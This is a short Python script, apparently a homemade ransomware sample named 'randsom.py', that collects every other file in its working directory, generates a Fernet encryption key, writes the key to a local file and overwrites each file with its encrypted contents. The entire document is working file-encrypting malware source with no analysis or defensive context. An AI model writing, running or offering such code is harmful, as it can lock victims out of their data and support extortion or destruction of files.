import os
from cryptography.fernet import Fernet

file_list = []

for file in os.listdir():
    if file == "randsom.py" or file == "generatedkey.key":
        continue
    if os.path.isfile(file):
        file_list.append(file)

print(file_list)

key = Fernet.generate_key()

print(key)

with open("generatedkey.key", "wb") as  files:
    files.write(key)

for the_files in file_list:
    with open(the_files, "rb") as files:
        content = files.read()

    contents_encryped = Fernet(key).encrypt(content)
    
    with open(the_files, "wb") as files:
        files.write(contents_encryped)